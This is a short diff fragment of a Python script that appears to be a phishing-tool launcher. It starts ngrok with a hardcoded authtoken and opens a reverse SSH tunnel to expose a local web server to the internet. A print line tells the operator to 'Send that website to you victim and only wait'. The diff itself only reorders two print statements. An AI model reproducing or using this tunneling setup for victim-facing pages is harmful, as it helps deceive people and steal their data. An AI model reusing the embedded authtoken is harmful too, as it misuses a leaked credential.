@@ -28,8 +28,8 @@ while True:
      print ("starting ngrok")
      os.system("./ngrok authtoken 1otl8ouPfwH3JwCDCD4fxu2YCgq_624ab5GeqzJhPPwHUbauT")
      os.system("./ngrok ssh -R 8080:localhost:8088 remoteUser@IPAddress")
-     print("Send that website to you victim and only wait ;)")
      print("if you see tis message ./ngrok: not found,please install ngrok")
+     print("Send that website to you victim and only wait ;)")
      input("\npress enter to back")
      os.system("clear")
      
